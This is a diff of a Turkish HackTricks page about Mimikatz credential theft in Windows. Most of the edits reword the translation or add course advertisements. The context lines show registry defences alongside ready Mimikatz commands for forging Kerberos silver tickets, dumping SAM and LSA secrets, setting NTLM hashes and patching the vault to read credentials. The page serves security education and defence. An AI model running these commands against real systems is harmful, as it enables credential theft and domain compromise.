@@ -9,27 +9,34 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
 
-**Bu sayfa [adsecurity.org](https://adsecurity.org/?page\_id=1821) sayfasına dayanmaktadır**. Daha fazla bilgi için orijinalini kontrol edin!
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**Mobil Güvenlik** alanındaki uzmanlığınızı 8kSec Akademisi ile derinleştirin. Kendi hızınızda ilerleyerek iOS ve Android güvenliğini öğrenin ve sertifika kazanın:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
+**Bu sayfa [adsecurity.org](https://adsecurity.org/?page\_id=1821) adresinden alınmıştır**. Daha fazla bilgi için orijinaline bakın!
 
 ## LM ve Bellekte Düz Metin
 
 Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgisi hırsızlığına karşı önemli önlemler alınmıştır:
 
-- **LM hash'leri ve düz metin şifreleri** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmamasını sağlamak için _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ kayıt defteri ayarının `0` DWORD değeri ile yapılandırılması gerekmektedir.
+- **LM hash'leri ve düz metin şifreleri** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmamasını sağlamak için _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarı, `0` DWORD değeri ile yapılandırılmalıdır.
 
 - **LSA Koruması**, Yerel Güvenlik Otoritesi (LSA) sürecini yetkisiz bellek okuma ve kod enjeksiyonuna karşı korumak için tanıtılmıştır. Bu, LSASS'in korunan bir süreç olarak işaretlenmesiyle sağlanır. LSA Korumasının etkinleştirilmesi şunları içerir:
-1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterini `RunAsPPL` değerini `dword:00000001` olarak ayarlayarak değiştirmek.
+1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterini değiştirerek `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
 2. Bu kayıt defteri değişikliğini yönetilen cihazlar arasında zorunlu kılan bir Grup Politika Nesnesi (GPO) uygulamak.
 
 Bu korumalara rağmen, Mimikatz gibi araçlar belirli sürücüleri kullanarak LSA Korumasını aşabilir, ancak bu tür eylemlerin olay günlüklerinde kaydedilmesi muhtemeldir.
 
-### SeDebugPrivilege Kaldırma ile Mücadele
+### SeDebugPrivilege Kaldırılmasına Karşı Önlem
 
 Yönetici kullanıcılar genellikle programları hata ayıklama yeteneği veren SeDebugPrivilege'e sahiptir. Bu ayrıcalık, yetkisiz bellek dökümünü önlemek için kısıtlanabilir; bu, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Ancak, bu ayrıcalık kaldırıldığında bile, TrustedInstaller hesabı özelleştirilmiş bir hizmet yapılandırması kullanarak bellek dökümleri gerçekleştirebilir:
 ```bash
@@ -92,7 +99,7 @@ Silver Ticket'lar belirli hizmetlere erişim sağlar. Ana komut ve parametreler:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Trust Ticket Oluşturma
+### Trust Ticket Creation
 
 Trust Ticket'lar, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:
 
@@ -146,7 +153,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **LSADUMP::SAM**: Yerel SAM veritabanına erişim sağlar.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Kayıt defterinde saklanan sırları deşifre eder.
+- **LSADUMP::Secrets**: Kayıt defterinde saklanan sırları şifrelerini çözer.
 - `mimikatz "lsadump::secrets" exit`
 
 - **LSADUMP::SetNTLM**: Bir kullanıcı için yeni bir NTLM hash'i ayarlar.
@@ -199,6 +206,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**Mobil Güvenlik** konusundaki uzmanlığınızı 8kSec Akademi ile derinleştirin. Kendi hızınızda kurslarımızla iOS ve Android güvenliğini öğrenin ve sertifika alın:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
 AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -209,7 +222,7 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
 * **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
-* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**
+* **Hacking ipuçlarını [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.**
 
 </details>
 {% endhint %}
